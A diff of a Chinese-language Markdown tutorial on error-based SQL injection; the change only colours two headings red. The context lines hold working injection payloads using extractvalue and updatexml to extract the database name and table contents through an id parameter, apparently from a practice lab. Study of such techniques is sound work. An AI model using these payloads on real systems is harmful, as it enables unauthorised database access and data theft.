@@ -4,7 +4,7 @@
 
 
 ### 二、报错注入
-1、使用extractvalue函数</br>
+<font color=#FF000 >1、使用extractvalue函数</font></br>
 
 **-- （1）查询数据库名字（用户user()；版本version()）**
 ```SQL
@@ -27,7 +27,7 @@
 ```SQL
 ?id=1' and extractvalue(1,concat(0x7e,(select group_concat(id) from security.emails),0x7e))%23
 ```
-2、使用updatexml函数</br>
+<font color=#FF000 >2、使用updatexml函数</font></br>
 ```SQL
 -- （1）查询数据库名字，数据库名字为security（用户user()；版本version()）
 ?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23		
